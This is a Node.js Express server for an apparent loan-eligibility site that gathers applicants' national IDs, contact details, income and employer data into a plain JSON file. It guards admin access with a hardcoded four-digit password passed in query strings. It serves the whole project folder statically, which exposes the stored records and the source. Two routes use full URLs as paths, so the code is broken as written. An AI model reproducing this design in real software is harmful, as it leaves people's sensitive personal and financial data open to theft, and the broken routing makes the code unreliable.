const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 5000;
const DATA_FILE = path.join(__dirname, 'data.json');
const ADMIN_PASSWORD = '3462';

const ALLOWED_ORIGINS = [
  'https://admin-dashboard-s4rw.onrender.com',
  'https://fintechloans-ke.onrender.com'
];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  next();
});

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

let users = [];

function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, 'utf8');
      users = JSON.parse(data);
      console.log(`Loaded ${users.length} users from data.json`);
    } else {
      users = [];
      saveData();
      console.log('Created new data.json file');
    }
  } catch (error) {
    console.error('Error loading data:', error);
    users = [];
  }
}

function saveData() {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2), 'utf8');
    console.log(`Saved ${users.length} users to data.json`);
  } catch (error) {
    console.error('Error saving data:', error);
  }
}

loadData();

app.post('https://admin-dashboard-s4rw.onrender.com/submit-eligibility', (req, res) => {
  try {
    const userData = {
      id: Date.now(),
      timestamp: new Date().toISOString(),
      fullName: req.body.fullName,
      email: req.body.email,
      phone: req.body.phone,
      nationalId: req.body.nationalId,
      county: req.body.county,
      employment: req.body.employment,
      education: req.body.education,
      loanAmount: req.body.loanAmount,
      gender: req.body.gender,
      dob: req.body.dob,
      maritalStatus: req.body.maritalStatus,
      dependents: req.body.dependents,
      residentialAddress: req.body.residentialAddress,
      employerName: req.body.employerName,
      employmentDuration: req.body.employmentDuration,
      incomeType: req.body.incomeType,
      income: req.body.income,
      monthlyExpenses: req.body.monthlyExpenses,
      purpose: req.body.purpose
    };

    users.push(userData);
    saveData();

    console.log(`New application received from: ${userData.fullName}`);
    
    res.json({ 
      success: true, 
      message: 'Application submitted successfully',
      userId: userData.id
    });
  } catch (error) {
    console.error('Error processing submission:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Error processing your application' 
    });
  }
});

app.post('https://admin-dashboard-s4rw.onrender.com/admin/login', (req, res) => {
  const { password } = req.body;
  
  if (password === ADMIN_PASSWORD) {
    res.json({ success: true });
  } else {
    res.json({ success: false, message: 'Invalid password' });
  }
});

app.get('/admin/users', (req, res) => {
  const { password } = req.query;
  
  if (password === ADMIN_PASSWORD) {
    res.json({ success: true, users: users });
  } else {
    res.status(401).json({ success: false, message: 'Unauthorized' });
  }
});

app.get('/admin/user/:id', (req, res) => {
  const { password } = req.query;
  
  if (password === ADMIN_PASSWORD) {
    const user = users.find(u => u.id === parseInt(req.params.id));
    if (user) {
      res.json({ success: true, user: user });
    } else {
      res.status(404).json({ success: false, message: 'User not found' });
    }
  } else {
    res.status(401).json({ success: false, message: 'Unauthorized' });
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server is running on http://0.0.0.0:${PORT}`);
  console.log(`Admin dashboard: http://0.0.0.0:${PORT}/admin.html`);
  console.log(`Total applications: ${users.length}`);
});
